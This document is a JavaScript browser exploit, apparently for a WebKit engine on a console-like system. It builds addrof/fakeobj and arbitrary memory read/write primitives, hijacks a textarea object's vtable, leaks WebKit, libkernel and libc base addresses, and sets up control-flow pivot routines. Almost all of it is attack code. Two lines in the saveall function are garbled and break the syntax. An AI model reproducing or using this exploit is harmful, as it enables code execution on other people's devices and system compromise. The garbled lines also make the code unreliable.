
function i48_put(x, a) {
    a[4] = x | 0;
    a[5] = (x / 4294967296) | 0
}

function i48_get(a) {
    return a[4] + a[5] * 4294967296
}

function addrof(x) {
    leaker_obj.a = x;
    return i48_get(leaker_arr)
}

function fakeobj(x) {
    i48_put(x, leaker_arr);
    return leaker_obj.a
}

function read_mem_setup(p, sz) {
    i48_put(p, oob_master);
    oob_master[6] = sz
}

function read_mem(p, sz) {
    read_mem_setup(p, sz);
    var arr = [];
    for (var i = 0; i < sz; i += 1) {
        arr.push(oob_slave[i])
    }
    return arr
}

function read_mem_s(p, sz) {
    read_mem_setup(p, sz);
    return "" + oob_slave
}

function read_mem_b(p, sz) {
    read_mem_setup(p, sz);
    var b = new Uint8Array(sz);
    b.set(oob_slave);
    return b
}

function read_mem_as_string(p, sz) {
    var x = read_mem_b(p, sz);
    var ans = '';
    for (var i = 0; i < x.length; i += 1) {
        ans += String.fromCharCode(x[i])
    }
    return ans
}

function write_mem(p, data) {
    i48_put(p, oob_master);
    oob_master[6] = data.length;
    for (var i = 0; i < data.length; i += 1) {
        oob_slave[i] = data[i]
    }
}

function read_ptr_at(p) {
    var ans = 0;
    var d = read_mem(p, 8);
    for (var i = 7; i >= 0; i -= 1) {
        ans = 256 * ans + d[i]
    }
    return ans
}

function write_ptr_at(p, d) {
    var arr = [];
    for (var i = 0; i < 8; i += 1) {
        arr.push(d & 0xff);
        d /= 256
    }
    write_mem(p, arr)
}

function hex(x) {
    return (new Number(x)).toString(16)
}
var malloc_nogc = [];

function malloc(sz) {
    var arr = new Uint8Array(sz);
    malloc_nogc.push(arr);
    return read_ptr_at(addrof(arr) + 0x10)
}
var tarea = document.createElement('textarea');
var real_vt_ptr = read_ptr_at(addrof(tarea) + 0x18);
var fake_vt_ptr = malloc(0x400);
write_mem(fake_vt_ptr, read_mem(real_vt_ptr, 0x400));
var real_vtable = read_ptr_at(fake_vt_ptr);
var fake_vtable = malloc(0x2000);
write_mem(fake_vtable, read_mem(real_vtable, 0x2000));
write_ptr_at(fake_vt_ptr, fake_vtable);
var fake_vt_ptr_bak = malloc(0x400);
write_mem(fake_vt_ptr_bak, read_mem(fake_vt_ptr, 0x400));
var plt_ptr = read_ptr_at(fake_vtable) - 10063176;

function get_got_addr(idx) {
    var p = plt_ptr + idx * 16;
    var q = read_mem(p, 6);
    if (q[0] != 0xff || q[1] != 0x25) {
        throw "invalid GOT entry"
    }
    var offset = 0;
    for (var i = 5; i >= 2; i -= 1) {
        offset = offset * 256 + q[i]
    }
    offset += p + 6;
    return read_ptr_at(offset)
}
var webkit_base = read_ptr_at(fake_vtable);
var libkernel_base = get_got_addr(705) - 0x10000;
var libc_base = get_got_addr(582);
var saveall_addr = libc_base + 0x2e2c8;
var loadall_addr = libc_base + 0x3275c;
var setjmp_addr = libc_base + 0xbfae0;
var longjmp_addr = libc_base + 0xbfb30;
var pivot_addr = libc_base + 0x327d2;
var infloop_addr = libc_base + 0x447a0;
var jop_frame_addr = libc_base + 0x715d0;
var get_errno_addr_addr = libkernel_base + 0x9ff0;
var pthread_create_addr = libkernel_base + 0xf980;

function saveall() {
    var ans = malloc(0x800);
    var bak = read_ptr_at(fake_vtable + 0x1d8);
    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
    write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable + 0x1d8);
    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
    write_ptr_at(fake_vt_ptr + 0x38, 0x1234);
    write_ptr_ataddroftarea + 0x18, fake_vt_ptr;
    tarea.scrollLeft = 0;
    write_ptr_ataddroftarea + 0x18, real_vt_ptr;
    write_mem(ans + 0x400, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    return ans
}

function pivot(buf) {
    var ans = malloc(0x400);
    var bak = read_ptr_at(fake_vtable + 0x1d8);
    write_ptr_at(fake_vtable + 0x1d8, saveall_addr);
    write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
    write_mem(ans, read_mem(fake_vt_ptr, 0x400));
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400));
    var bak = read_ptr_at(fake_vtable + 0x1d8);
    write_ptr_at(fake_vtable + 0x1d8, pivot_addr);
    write_ptr_at(fake_vt_ptr + 0x38, buf);
    write_ptr_at(ans + 0x38, read_ptr_at(ans + 0x38) - 16);
    write_ptr_at(buf, ans);
    write_ptr_at(addrof(tarea) + 0x18, fake_vt_ptr);
    tarea.scrollLeft = 0;
    write_ptr_at(addrof(tarea) + 0x18, real_vt_ptr);
    write_mem(fake_vt_ptr, read_mem(fake_vt_ptr_bak, 0x400))
}
